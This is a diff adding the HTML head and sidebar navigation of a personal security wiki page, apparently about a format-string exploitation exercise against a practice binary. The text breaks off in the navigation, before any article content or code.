@@ -1,0 +1,2069 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Exploiting format string vulnerability in babyfmt_level8.0 with Full RELRO + PIE by leaking libc and binary base addresses, calculating offsets, and overwriting return addresses.">
+      
+      
+        <meta name="author" content="İsmail BOZKURT">
+      
+      
+        <link rel="canonical" href="https://ismailbozkurt.github.io/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/">
+      
+      
+        <link rel="prev" href="../08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/">
+      
+      
+        <link rel="next" href="../10-Format-String-Attack-Format-String-Attack-Once/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled) - Dreamer's Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../custom.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled) - Dreamer's Wiki" >
+      
+        <meta  property="og:description"  content="Exploiting format string vulnerability in babyfmt_level8.0 with Full RELRO + PIE by leaking libc and binary base addresses, calculating offsets, and overwriting return addresses." >
+      
+        <meta  property="og:image"  content="https://ismailbozkurt.github.io/Dreamer-Wiki/assets/images/social/Pwn/Linux/Format String Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-(Full-Relro+PIE-Enabled).png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://ismailbozkurt.github.io/Dreamer-Wiki/Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled) - Dreamer's Wiki" >
+      
+        <meta  name="twitter:description"  content="Exploiting format string vulnerability in babyfmt_level8.0 with Full RELRO + PIE by leaking libc and binary base addresses, calculating offsets, and overwriting return addresses." >
+      
+        <meta  name="twitter:image"  content="https://ismailbozkurt.github.io/Dreamer-Wiki/assets/images/social/Pwn/Linux/Format String Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-(Full-Relro+PIE-Enabled).png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#format-string-attack-redirect-code-execution-full-relropie-enabled" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="Dreamer&#39;s Wiki" class="md-header__button md-logo" aria-label="Dreamer's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Dreamer's Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Dreamer&#39;s Wiki" class="md-nav__button md-logo" aria-label="Dreamer's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Dreamer's Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dreamer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ActiveDirectory
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            ActiveDirectory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ActiveDirectory/1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ActiveDirectory/2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    CVE
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            CVE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ActiveDirectory/CVE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Fuzzing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Fuzzing/Linux/Fuzzing-environment-setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Docker Environment Setup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Malware
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Malware
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Malware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pwn
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Pwn
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PWN-Index/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PWN Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Environment-setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Docker Environment Setup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_2_2" id="__nav_5_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Format String Vulnerabilities
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Format String Vulnerabilities
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to Format String Vulnerabilities
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-Format-String-Attack-The-Stack-Leak-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    The Stack Leak 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-Format-String-Attack-The-Stack-Leak-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    The Stack Leak 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-Format-String-Attack-The-BSS-Leak/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    The BSS Leak
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-Format-String-Attack-Write-what-where-1-byte/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write-What-Where - 1 byte
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-Format-String-Attack-Write-what-where-8-bytes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write-What-Where - 8 bytes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-Format-String-Attack-printf-Dynamic-padding-size/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write-What-Where - `printf` Dynamic Padding Size (`*`)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../08-Format-String-Attack-Redirect-Code-Execution-to-win-%28GOT-Overwrite%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - Redirect Code Execution (GOT Overwrite)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled)
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - Redirect Code Execution (Full RELRO + PIE Enabled)
+    
+  </span>
+  
+
+      </a>
+      
+        
+
